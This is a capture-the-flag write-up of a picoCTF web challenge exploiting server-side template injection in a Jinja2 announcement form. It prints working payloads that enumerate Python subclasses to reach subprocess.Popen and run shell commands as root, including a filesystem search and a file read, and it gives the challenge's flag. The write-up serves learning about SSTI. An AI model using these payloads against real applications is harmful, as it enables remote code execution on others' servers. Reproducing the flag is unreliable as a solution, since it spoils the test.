# Server Side Template Injection Exploit

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Platform:** picoCTF  

---

## Challenge Overview

The challenge was to exploit a Server-Side Template Injection (SSTI) vulnerability in a simple web application that allowed users to submit announcements. The application unsafely rendered user input through a Python Jinja2 template engine, enabling arbitrary code execution on the server.

The goal was to leverage SSTI to execute system commands, escalate privileges, and ultimately retrieve the CTF flag stored on the server.

---

## Tools Used

- Web browser (for input)  
- Burp Suite (optional, for payload testing)  
- Knowledge of Python/Jinja2 template internals  

---

## Initial Analysis

The announcement input was tested for SSTI by submitting template expressions such as `{{7*7}}`. The server evaluated the expression and returned `49`, confirming SSTI.

Further probing with `{{ ''.__class__.__mro__[1].__subclasses__() }}` revealed access to Python internals, including many subclasses of the base `object` class.

---

## Exploitation Process

### 1. Enumerate Subclasses to Find `subprocess.Popen`

The key to remote code execution was finding the index of the `subprocess.Popen` class in the subclass list. This class allows execution of system commands.

A payload was crafted to list class names with their indexes:

```jinja2
{% for i in range(0, 20) %}
  {{ i }} - {{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }}<br>
{% endfor %}
```

Due to server limits, the enumeration was done in small batches to avoid crashing the server.

An automated payload was used to find the index of Popen:

```
{% for i in range(0, 600) %}
  {% if ''.__class__.__mro__[1].__subclasses__()[i].__name__ == 'Popen' %}
    Found Popen at index: {{ i }}
  {% endif %}
{% endfor %}
```

The Popen class was found at index 356.

---

### 2. Execute Commands Using subprocess.Popen

Using the discovered index, arbitrary commands were run on the server. For example, to run id:

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('id', shell=True, stdout=-1).stdout.read() }}
```

This returned:

```
b'uid=0(root) gid=0(root) groups=0(root)\n'
```

indicating root privileges.

---

### 3. Locate and Read the Flag

The root home directory was inspected but contained only standard config files.

A system-wide search for files containing “flag” was performed:

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('find / -iname "*flag*" 2>/dev/null', shell=True, stdout=-1).stdout.read() }}
```

This revealed the file /challenge/flag.

The flag was read with:

```
{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat /challenge/flag', shell=True, stdout=-1).stdout.read() }}
```

---

## Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
```

---

## Summary

By exploiting SSTI in a Jinja2 template, we achieved remote code execution with root privileges. Careful subclass enumeration allowed us to locate the subprocess. Popen class and execute system commands. Finally, a system-wide search revealed the flag file, which was successfully read.
